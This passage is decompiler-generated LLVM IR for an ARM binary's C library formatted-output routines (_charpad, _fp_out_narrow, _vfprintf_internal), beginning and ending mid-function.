  store i32 %v4_129b8, i32* @ip, align 4
  store i32 76228, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_129b8)
  %v0_129c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %bb16, %dec_label_pc_1298c
  %v0_129d4 = phi i32 [ %tmp, %bb16 ], [ %v0_129c4.pre, %dec_label_pc_1298c ]
  %v1_129c4 = inttoptr i32 %v0_129d4 to i16*
  %v2_129c4 = load i16, i16* %v1_129c4, align 2
  %v1_129c8 = and i16 %v2_129c4, 192
  %v2_129cc = icmp eq i16 %v1_129c8, 192
  br i1 %v2_129cc, label %dec_label_pc_129ec, label %dec_label_pc_129d4

dec_label_pc_129d4:                               ; preds = %dec_label_pc_129c4
  %v4_129dc = call i32 @__stdio_trans2w_o(i16* %v1_129c4, i32 128)
  %v2_129e0 = icmp eq i32 %v4_129dc, 0
  br i1 %v2_129e0, label %dec_label_pc_129d4.dec_label_pc_129ec_crit_edge, label %dec_label_pc_12a00

dec_label_pc_129d4.dec_label_pc_129ec_crit_edge:  ; preds = %dec_label_pc_129d4
  %v0_129ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129ec

dec_label_pc_129ec:                               ; preds = %dec_label_pc_129d4.dec_label_pc_129ec_crit_edge, %dec_label_pc_129c4
  %v0_129ec = phi i32 [ %v0_129ec.pre, %dec_label_pc_129d4.dec_label_pc_129ec_crit_edge ], [ %v0_129d4, %dec_label_pc_129c4 ]
  %v0_129f0 = load i32, i32* @sl, align 4
  %v0_129f4 = load i32, i32* @r8, align 4
  %v4_129f8 = inttoptr i32 %v0_129f0 to i8*
  %v5_129f8 = call i32 @_vfprintf_internal(i32 %v0_129ec, i8* %v4_129f8, i32 %v0_129f4)
  br label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129d4, %dec_label_pc_129ec
  %storemerge = phi i32 [ %v5_129f8, %dec_label_pc_129ec ], [ -1, %dec_label_pc_129d4 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_12a00 = load i32, i32* @r7, align 4
  %v2_12a00 = icmp eq i32 %v0_12a00, 0
  br i1 %v2_12a00, label %dec_label_pc_12a00..thread4_crit_edge, label %bb18

dec_label_pc_12a00..thread4_crit_edge:            ; preds = %dec_label_pc_12a00
  br label %.thread4

bb18:                                             ; preds = %dec_label_pc_12a00
  %v1_12a10 = load i32, i32* @r6, align 4
  %v3_12a10 = add i32 %v1_12a10, 28
  %v4_12a10 = inttoptr i32 %v3_12a10 to i32*
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12a00..thread4_crit_edge, %bb18
  %v0_12a18.in = phi i32* [ @ip, %dec_label_pc_12a00..thread4_crit_edge ], [ %v4_12a10, %bb18 ]
  %v0_12a18 = load i32, i32* %v0_12a18.in, align 4
  %v2_12a18 = xor i1 %v2_12a00, true
  call void @__pseudo_cond_branch(i1 %v2_12a18, i32 %v0_12a18)
  %v0_12a1c = load i32, i32* %r4.global-to-local, align 4
  %v2_12a24 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12a24, i32* %r4.global-to-local, align 4
  ret i32 %v0_12a1c

; uselistorder directives
  uselistorder i32 %v4_12960, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_12a00, { 1, 0 }
  uselistorder label %dec_label_pc_129c4, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_12a30(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a30:
  %v0_12a30 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12a30, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12a30
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12a30, %bb
  %v10_12a3c = phi i32 [ %arg1, %dec_label_pc_12a30 ], [ 0, %bb ]
  ret i32 %v10_12a3c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_12a40 = load i32, i32* @r4, align 4
  %v6_12a40 = load i32, i32* @r5, align 4
  %v9_12a40 = load i32, i32* @r6, align 4
  %v12_12a40 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_12a4c = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_12a4c, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_12a643 = icmp eq i32 %arg3, 0
  br i1 %v2_12a643, label %dec_label_pc_12a84, label %dec_label_pc_12a78

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a78
  %v1_12a60 = add i32 %v0_12a60, -1
  store i32 %v1_12a60, i32* @r4, align 4
  %v2_12a64 = icmp eq i32 %v1_12a60, 0
  %v0_12a70 = load i32, i32* @r7, align 4
  br i1 %v2_12a64, label %dec_label_pc_12a84.loopexit, label %dec_label_pc_12a78

dec_label_pc_12a78:                               ; preds = %entry, %dec_label_pc_12a60
  %v0_12a705 = phi i32 [ %v0_12a70, %dec_label_pc_12a60 ], [ %arg1, %entry ]
  %v3_12a78 = inttoptr i32 %v0_12a705 to i16*
  %v4_12a78 = call i32 @__stdio_fwrite(i32 %v10_12a4c, i32 1, i16* %v3_12a78)
  %v7_12a7c = icmp eq i32 %v4_12a78, 1
  %v0_12a60 = load i32, i32* @r4, align 4
  br i1 %v7_12a7c, label %dec_label_pc_12a60, label %dec_label_pc_12a84.loopexit

dec_label_pc_12a84.loopexit:                      ; preds = %dec_label_pc_12a60, %dec_label_pc_12a78
  %v0_12a84.ph = phi i32 [ %v0_12a60, %dec_label_pc_12a78 ], [ 0, %dec_label_pc_12a60 ]
  %v1_12a84.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12a84

dec_label_pc_12a84:                               ; preds = %dec_label_pc_12a84.loopexit, %entry
  %v1_12a84 = phi i32 [ 0, %entry ], [ %v1_12a84.pre, %dec_label_pc_12a84.loopexit ]
  %v0_12a84 = phi i32 [ 0, %entry ], [ %v0_12a84.ph, %dec_label_pc_12a84.loopexit ]
  %v2_12a84 = sub i32 %v1_12a84, %v0_12a84
  store i32 %v3_12a40, i32* @r4, align 4
  store i32 %v6_12a40, i32* @r5, align 4
  store i32 %v9_12a40, i32* @r6, align 4
  store i32 %v12_12a40, i32* @r7, align 4
  ret i32 %v2_12a84

; uselistorder directives
  uselistorder i32 %v1_12a60, { 1, 0 }
  uselistorder label %dec_label_pc_12a84.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_12a78, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12a94 = load i32, i32* @r4, align 4
  store i32 %v3_12a94, i32* %stack_var_-24, align 4
  %v6_12a94 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_12a9c = and i32 %arg2, 128
  %v2_12a9c = icmp eq i32 %v1_12a9c, 0
  %v0_12aa0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12aa0, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_12a9c, label %dec_label_pc_12af0thread-pre-split, label %dec_label_pc_12ab4

dec_label_pc_12ab4:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_12ab8 = call i32 @strlen(i8* %arg4)
  store i32 %v3_12ab8, i32* %r0.global-to-local, align 4
  %v1_12abc = load i32, i32* %r4.global-to-local, align 4
  %v2_12abc = sub i32 %v1_12abc, %v3_12ab8
  store i32 %v2_12abc, i32* @r4, align 4
  store i32 %v3_12ab8, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_12abc, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_12ad0

.thread:                                          ; preds = %dec_label_pc_12ab4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12aec

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12ab4
  %v0_12ad0 = load i32, i32* @r5, align 4
  %v1_12ad0 = urem i32 %v0_12ad0, 128
  %v0_12ad4 = load i32, i32* @r8, align 4
  store i32 %v0_12ad4, i32* %r0.global-to-local, align 4
  %v3_12adc = trunc i32 %v1_12ad0 to i8
  %v4_12adc = call i32 @_charpad(i32 %v0_12ad4, i8 %v3_12adc, i32 %v2_12abc)
  store i32 %v4_12adc, i32* %r0.global-to-local, align 4
  %v1_12ae0 = load i32, i32* @r4, align 4
  %v9_12ae0 = icmp eq i32 %v4_12adc, %v1_12ae0
  store i32 %v4_12adc, i32* %r5.global-to-local, align 4
  br i1 %v9_12ae0, label %dec_label_pc_12ad0.dec_label_pc_12aec_crit_edge, label %dec_label_pc_12b0c

dec_label_pc_12ad0.dec_label_pc_12aec_crit_edge:  ; preds = %dec_label_pc_12ad0
  %v0_12aec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12aec

dec_label_pc_12aec:                               ; preds = %.thread, %dec_label_pc_12ad0.dec_label_pc_12aec_crit_edge
  %v0_12aec = phi i32 [ %v0_12aec.pre, %dec_label_pc_12ad0.dec_label_pc_12aec_crit_edge ], [ %v3_12ab8, %.thread ]
  store i32 %v0_12aec, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12af0

dec_label_pc_12af0thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12af0

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12af0thread-pre-split, %dec_label_pc_12aec
  %v5_12afc = phi i32 [ %arg3, %dec_label_pc_12af0thread-pre-split ], [ %v0_12aec, %dec_label_pc_12aec ]
  %tmp14 = icmp slt i32 %v5_12afc, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_12af0
  br label %bb15

bb:                                               ; preds = %dec_label_pc_12af0
  %v5_12af8 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_12af8, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_18654.1031 to i32))
  %v0_12b08 = load i32, i32* %r5.global-to-local, align 4
  %v2_12b08 = add i32 %storemerge, %v0_12b08
  store i32 %v2_12b08, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12b0c

dec_label_pc_12b0c:                               ; preds = %dec_label_pc_12ad0, %bb15
  %v0_12b0c = phi i32 [ %v4_12adc, %dec_label_pc_12ad0 ], [ %v2_12b08, %bb15 ]
  store i32 %v0_12b0c, i32* %r0.global-to-local, align 4
  %v2_12b10 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12b10, i32* %r4.global-to-local, align 4
  store i32 %v6_12a94, i32* %r5.global-to-local, align 4
  ret i32 %v0_12b0c

; uselistorder directives
  uselistorder i32 %v0_12b0c, { 1, 0 }
  uselistorder i32 %v0_12aec, { 1, 0 }
  uselistorder i32 %v2_12abc, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12b0c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12aec, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_12b18 = load i32, i32* @r5, align 4
  %v9_12b18 = load i32, i32* @r6, align 4
  %v12_12b18 = load i32, i32* @r7, align 4
  %v18_12b18 = load i32, i32* @sb, align 4
  %v21_12b18 = load i32, i32* @sl, align 4
  %v24_12b18 = load i32, i32* @fp, align 4
  %v2_12b20 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_12b20, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_12b20, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_12b30 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12b30, i32* @r5, align 4
  %v2_12b34 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_12b34, i32* %r0.global-to-local, align 4
  %v1_12b3c = icmp slt i32 %v2_12b34, 0
  br i1 %v1_12b3c, label %dec_label_pc_12b4c, label %dec_label_pc_12b80

dec_label_pc_12b4c:                               ; preds = %entry
  %v3_12b4c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_12b4c, i32* @r4, align 4
  %v1_12b50 = inttoptr i32 %v3_12b4c to i8*
  store i32 %v3_12b4c, i32* %r0.global-to-local, align 4
  %v3_12b54 = call i32 @strlen(i8* %v1_12b50)
  store i32 %v3_12b54, i32* %r0.global-to-local, align 4
  %v2_12b58 = icmp eq i32 %v3_12b54, 0
  br i1 %v2_12b58, label %bb, label %dec_label_pc_12b68

bb:                                               ; preds = %dec_label_pc_12b4c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_131d0

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b4c
  %v0_12b68 = load i32, i32* @r4, align 4
  store i32 %v0_12b68, i32* %r0.global-to-local, align 4
  %v0_12b6c = load i32, i32* @fp, align 4
  store i32 %v0_12b6c, i32* %r2.global-to-local, align 4
  %v3_12b70 = inttoptr i32 %v0_12b6c to i16*
  %v4_12b70 = call i32 @__stdio_fwrite(i32 %v0_12b68, i32 %v3_12b54, i16* %v3_12b70)
  store i32 %v4_12b70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131d0

dec_label_pc_12b80:                               ; preds = %entry
  %v0_12b80 = load i32, i32* @r5, align 4
  store i32 %v2_12b20, i32* %r0.global-to-local, align 4
  %v2_12b88 = call i32 @_ppfs_prepargs(i32 %v2_12b20, i32 %v0_12b80)
  store i32 %v2_12b88, i32* %r0.global-to-local, align 4
  store i32 1072, i32* @ip, align 4
  %v0_12bd0 = load i32, i32* @r4, align 4
  store i32 %v0_12bd0, i32* %r2.global-to-local, align 4
  %v1_12c54 = bitcast i32* %stack_var_-352 to i8*
  %v4_12c64 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_12c70 = ptrtoint i32* %stack_var_-272 to i32
  %v2_12c88 = ptrtoint i32* %stack_var_-40 to i32
  %v2_12ca4 = icmp eq i32 %tmp104, 0
  %v2_12fdc = ptrtoint i32* %stack_var_-200 to i32
  %v2_13020 = ptrtoint i32* %stack_var_-348 to i32
  %v2_13024 = ptrtoint i32* %stack_var_-72 to i32
  %v2_12ed8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_12ee4 = ptrtoint i32* %stack_var_-52 to i32
  %v7_12d40 = zext i8 %tmp102 to i32
  %v2_12d78 = ptrtoint i32* %stack_var_-73 to i32
  %v1_12d80 = bitcast i32* %stack_var_-73 to i8*
  %v2_12d88 = icmp ugt i32 %tmp104, 4
  %v7_12d88 = icmp eq i32 %tmp104, 5
  %v7_12c6c = ptrtoint i32* %stack_var_-280 to i32
  %v5_12c9c195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_12eac = icmp ugt i32 %tmp104, 16
  %v7_12eac = icmp eq i32 %tmp104, 17
  %v2_12eb0 = xor i1 %v7_12eac, true
  %v3_12eb0 = and i1 %v2_12eac, %v2_12eb0
  %v2_12f34 = icmp ugt i32 %tmp104, 18
  %v7_12f34 = icmp eq i32 %tmp104, 19
  %v2_12f38 = xor i1 %v7_12f34, true
  %v3_12f38 = and i1 %v2_12f34, %v2_12f38
  %v7_12fd0 = icmp eq i32 %tmp104, 20
  %v1_12ce8 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -5421)
  %v2_12ce8 = inttoptr i32 %v1_12ce8 to i8*
  %v2_12d14 = xor i1 %v7_12d88, true
  %v3_12d14 = and i1 %v2_12d88, %v2_12d14
  %v7_12d48 = icmp eq i32 %tmp104, 1
  %v2_12d90 = xor i1 %v2_12d88, true
  %v3_12d90 = or i1 %v7_12d88, %v2_12d90
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_12df8 = icmp eq i32 %tmp104, 3
  %v11_12e04 = icmp eq i32 %tmp104, 4
  %v9_12c74 = mul nuw nsw i32 %v4_12c64, 8
  %v10_12c74 = add i32 %v7_12c6c, %v9_12c74
  br label %dec_label_pc_12bd4.outer

dec_label_pc_12bd4.outer:                         ; preds = %dec_label_pc_131b4, %dec_label_pc_12b80
  %v0_12bd445 = phi i32 [ %v3_131b4, %dec_label_pc_131b4 ], [ %v0_12bd0, %dec_label_pc_12b80 ]
  %v0_12d08 = phi i32 [ %stack_var_-336.4, %dec_label_pc_131b4 ], [ %tmp103, %dec_label_pc_12b80 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_131b4 ], [ 0, %dec_label_pc_12b80 ]
  br label %dec_label_pc_12bd4.outer36

dec_label_pc_12bd4.outer36:                       ; preds = %dec_label_pc_12bd4.outer, %dec_label_pc_131c0
  %v0_12bd444 = phi i32 [ %v0_12bd445, %dec_label_pc_12bd4.outer ], [ %v1_131c0, %dec_label_pc_131c0 ]
  %v5_12c00 = phi i32 [ %v0_12bd445, %dec_label_pc_12bd4.outer ], [ %v1_12c30, %dec_label_pc_131c0 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_12bd4.outer ], [ %v1_130a0, %dec_label_pc_131c0 ]
  %v1_12bd4188 = inttoptr i32 %v0_12bd444 to i8*
  %v2_12bd4189 = load i8, i8* %v1_12bd4188, align 1
  %v2_12bd8191 = icmp eq i8 %v2_12bd4189, 0
  br i1 %v2_12bd8191, label %dec_label_pc_12bf0, label %bb138

bb138:                                            ; preds = %dec_label_pc_12bd4.outer36, %.thread6
  %v2_12bd4193 = phi i8 [ %v2_12bd4, %.thread6 ], [ %v2_12bd4189, %dec_label_pc_12bd4.outer36 ]
  %v1_12be8192 = phi i32 [ %v2_12be8, %.thread6 ], [ %v0_12bd444, %dec_label_pc_12bd4.outer36 ]
  %v8_12bdc = icmp eq i8 %v2_12bd4193, 37
  br i1 %v8_12bdc, label %dec_label_pc_12bf0, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12be8 = add i32 %v1_12be8192, 1
  store i32 %v2_12be8, i32* @r4, align 4
  %v1_12bd4 = inttoptr i32 %v2_12be8 to i8*
  %v2_12bd4 = load i8, i8* %v1_12bd4, align 1
  %v2_12bd8 = icmp eq i8 %v2_12bd4, 0
  br i1 %v2_12bd8, label %dec_label_pc_12bf0, label %bb138

dec_label_pc_12bf0:                               ; preds = %bb138, %.thread6, %dec_label_pc_12bd4.outer36
  %v1_12be8.lcssa = phi i32 [ %v0_12bd444, %dec_label_pc_12bd4.outer36 ], [ %v2_12be8, %.thread6 ], [ %v1_12be8192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12bf0 = sub i32 %v1_12be8.lcssa, %v5_12c00
  %v9_12bf0 = icmp eq i32 %v1_12be8.lcssa, %v5_12c00
  br i1 %v9_12bf0, label %dec_label_pc_12c24, label %dec_label_pc_12bf8

dec_label_pc_12bf8:                               ; preds = %dec_label_pc_12bf0
  store i32 %v2_12bf0, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_12bf0, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_12bf8
  store i32 %v5_12c00, i32* %r0.global-to-local, align 4
  %v5_12c08 = load i32, i32* @fp, align 4
  store i32 %v5_12c08, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_12bf8, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_12bf8 ]
  store i32 76816, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_18654.1031 to i32))
  %v0_12c10 = load i32, i32* %r0.global-to-local, align 4
  %v1_12c10 = load i32, i32* @r5, align 4
  %v9_12c10 = icmp eq i32 %v0_12c10, %v1_12c10
  br i1 %v9_12c10, label %dec_label_pc_12c18, label %dec_label_pc_131c8

dec_label_pc_12c18:                               ; preds = %bb142
  %v2_12c1c = add i32 %v0_12c10, %stack_var_-356.1.ph37
  store i32 %v2_12c1c, i32* @ip, align 4
  %v0_12c24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12c24

dec_label_pc_12c24:                               ; preds = %dec_label_pc_12bf0, %dec_label_pc_12c18
  %v0_12c38 = phi i32 [ %v5_12c00, %dec_label_pc_12bf0 ], [ %v0_12c24.pre, %dec_label_pc_12c18 ]
  %v1_130a0 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_12bf0 ], [ %v2_12c1c, %dec_label_pc_12c18 ]
  %v1_12c24 = inttoptr i32 %v0_12c38 to i8*
  %v2_12c24 = load i8, i8* %v1_12c24, align 1
  %v2_12c28 = icmp eq i8 %v2_12c24, 0
  br i1 %v2_12c28, label %dec_label_pc_131d0, label %dec_label_pc_12c30

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c24
  %v1_12c30 = add i32 %v0_12c38, 1
  %v2_12c30 = inttoptr i32 %v1_12c30 to i8*
  %v3_12c30 = load i8, i8* %v2_12c30, align 1
  %v7_12c34 = icmp eq i8 %v3_12c30, 37
  store i32 %v1_12c30, i32* %r2.global-to-local, align 4
  br i1 %v7_12c34, label %dec_label_pc_131c0, label %dec_label_pc_12c40

dec_label_pc_12c40:                               ; preds = %dec_label_pc_12c30
  store i32 %v2_12b20, i32* @r4, align 4
  store i32 %v2_12b20, i32* %r0.global-to-local, align 4
  store i32 %v1_12c30, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_12c54 = call i32 @_ppfs_parsespec(i8* %v1_12c54)
  store i32 %v2_12b20, i32* @r0, align 4
  %v0_12c5c = call i32 @_ppfs_setargs()
  store i32 %v0_12c5c, i32* %r0.global-to-local, align 4
  store i32 %v4_12c64, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_12c40
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_12c40, %bb145
  %storemerge = phi i32 [ %v10_12c74, %bb145 ], [ %v7_12c70, %dec_label_pc_12c40 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_12c9c195, label %dec_label_pc_12c80, label %dec_label_pc_12ca0

dec_label_pc_12c80:                               ; preds = %bb146, %dec_label_pc_12c80
  %v5_12c8c197 = phi i32 [ %v5_12c8c, %dec_label_pc_12c80 ], [ %v2_12c88, %bb146 ]
  %v0_12c80196 = phi i32 [ %v1_12c84, %dec_label_pc_12c80 ], [ %storemerge, %bb146 ]
  %v2_12c80 = add i32 %v5_12c8c197, -32
  %v3_12c80 = inttoptr i32 %v2_12c80 to i32*
  store i32 %v0_12c80196, i32* %v3_12c80, align 4
  %v0_12c84 = load i32, i32* %r0.global-to-local, align 4
  %v1_12c84 = add i32 %v0_12c84, 8
  store i32 %v1_12c84, i32* %r0.global-to-local, align 4
  %v1_12c8c.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12c8c = mul i32 %v1_12c8c.pre, 4
  %v5_12c8c = add i32 %v4_12c8c, %v2_12c88
  %v1_12c98 = add i32 %v1_12c8c.pre, 1
  store i32 %v1_12c98, i32* %r2.global-to-local, align 4
  %v5_12c9c = icmp slt i32 %v1_12c8c.pre, %tmp105
  br i1 %v5_12c9c, label %dec_label_pc_12c80, label %dec_label_pc_12ca0

dec_label_pc_12ca0:                               ; preds = %dec_label_pc_12c80, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_12ca4, label %dec_label_pc_12cac, label %dec_label_pc_12cd0

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12ca0
  %v3_12cac = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_130a0, i32* @ip, align 4
  %v1_12cb8 = inttoptr i32 %v3_12cac to i32*
  %v2_12cb8 = load i32, i32* %v1_12cb8, align 4
  store i32 %v2_12cb8, i32* %r0.global-to-local, align 4
  %v1_12cbc = and i32 %v0_12d08, 3840
  store i32 %v1_130a0, i32* %r2.global-to-local, align 4
  %v3_12cc4 = ashr i32 %v1_130a0, 31
  %v4_12cc8 = inttoptr i32 %v2_12cb8 to i16*
  %v5_12cc8 = call i32 @_store_inttype(i16* %v4_12cc8, i32 %v1_12cbc, i32 %v1_130a0, i32 %v3_12cc4)
  store i32 %v5_12cc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131b4

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12ca0
  br i1 %tmp207, label %dec_label_pc_12e6c, label %dec_label_pc_12cd8

dec_label_pc_12cd8:                               ; preds = %dec_label_pc_12cd0
  %v3_12ce8 = load i8, i8* %v2_12ce8, align 1
  %v4_12ce8 = zext i8 %v3_12ce8 to i32
  %v7_12cec = icmp eq i8 %v3_12ce8, 10
  br i1 %v7_12cec, label %dec_label_pc_12cf8, label %bb147

bb147:                                            ; preds = %dec_label_pc_12cd8
  br label %bb151

dec_label_pc_12cf8:                               ; preds = %dec_label_pc_12cd8
  %v1_12d08 = and i32 %v0_12d08, 64
  %v2_12d08 = icmp eq i32 %v1_12d08, 0
  br i1 %v2_12d08, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_12cf8
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_12cf8, %bb150
  br i1 %v3_12d14, label %.thread, label %dec_label_pc_12d1c

.thread:                                          ; preds = %bb151
  %v5_12d14 = sub nsw i32 0, %v4_12ce8
  br label %dec_label_pc_12d34

dec_label_pc_12d1c:                               ; preds = %bb151
  br i1 %v7_12df8, label %bb152, label %dec_label_pc_12d28

bb152:                                            ; preds = %dec_label_pc_12d1c
  br label %dec_label_pc_12d34

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12d1c
  br i1 %v7_12d48, label %dec_label_pc_12d38, label %dec_label_pc_12d34

dec_label_pc_12d34:                               ; preds = %.thread, %bb152, %dec_label_pc_12d28
  %v0_12d6081 = phi i32 [ %v5_12d14, %.thread ], [ %v4_12ce8, %bb152 ], [ %v4_12ce8, %dec_label_pc_12d28 ]
  br label %dec_label_pc_12d38

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12d28, %dec_label_pc_12d34
  %v0_12d6080 = phi i32 [ %v0_12d6081, %dec_label_pc_12d34 ], [ %v4_12ce8, %dec_label_pc_12d28 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_12d34 ], [ 6, %dec_label_pc_12d28 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_12d38 = load i32, i32* %stack_var_-348, align 4
  %v1_12d3c = icmp slt i32 %v3_12d38, 0
  %v7_12d40. = select i1 %v1_12d3c, i32 %v7_12d40, i32 32
  store i32 %v7_12d40., i32* @sb, align 4
  br i1 %v7_12d48, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_12d38
  store i32 %v2_12c88, i32* %r2.global-to-local, align 4
  %v2_12d50 = load i32, i32* @ip, align 4
  %v5_12d50 = mul i32 %v2_12d50, 4
  %v6_12d50 = add i32 %v5_12d50, %v2_12c88
  %v2_12d54 = add i32 %v6_12d50, -276
  %v3_12d54 = inttoptr i32 %v2_12d54 to i32*
  %v4_12d54 = load i32, i32* %v3_12d54, align 4
  %v2_12d5c = and i32 %v4_12d54, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_12d38, %.thread15
